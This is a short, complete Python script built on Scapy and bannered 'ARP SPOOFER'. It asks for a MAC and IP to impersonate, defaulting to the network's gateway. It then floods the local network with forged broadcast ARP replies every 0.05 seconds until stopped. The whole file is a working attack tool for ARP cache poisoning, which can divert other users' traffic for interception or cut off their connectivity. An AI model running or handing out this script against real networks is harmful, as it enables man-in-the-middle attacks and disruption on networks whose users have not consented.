#!/usr/bin/env python3
#Created by PepeBigotes

import os, ctypes
try: is_admin = (os.getuid() == 0)
except AttributeError: is_admin = (ctypes.windll.shell32.IsUserAnAdmin() != 0)
if not is_admin:
    print("[!] You need root/admin priviledges to run this script")
    print("    Forgot to use sudo?")
    exit()

try: from scapy.all import *
except ImportError:
    print("[!] You need to have Scapy installed to run this script")
    print("    Try 'pip3 install scapy' or 'sudo apt install python3-scapy'")
    exit()

os.system('cls' if os.name=='nt' else 'clear')
print("""\
┌─┐┬─┐┌─┐   ┌─┐┌─┐┌─┐┌─┐┌─┐┌─┐┬─┐
├─┤├┬┘├─┘───└─┐├─┘│ ││ │├┤ ├┤ ├┬┘
┴ ┴┴└─┴     └─┘┴  └─┘└─┘└  └─┘┴└─
""")


try:
    mac = input("MAC to spoof (leave blank for random MAC):\n > ")
    ip = input("IP to spoof (leave blank for default gateway):\n > ")
    SRC_MAC = mac if mac else RandMAC()
    SRC_IP = ip if ip else conf.route.route('0.0.0.0')[2]
    DST_MAC = 'ff:ff:ff:ff:ff:ff'
    DST_IP = '255.255.255.255'

    print(f"\nsrc: {SRC_MAC} ; {SRC_IP}")
    print(f"dst: {DST_MAC} ; {DST_IP}\n")

    pkt = Ether(src=SRC_MAC, dst=DST_MAC) /\
          ARP(op=2, hwsrc=SRC_MAC, psrc=SRC_IP, hwdst=DST_MAC, pdst=DST_IP)

    print("Sending packets, press CTRL+C to stop.")
    sendp(pkt, loop=1, inter=0.05)
except KeyboardInterrupt:
    print('\nKeyboardInterrupt')
    exit()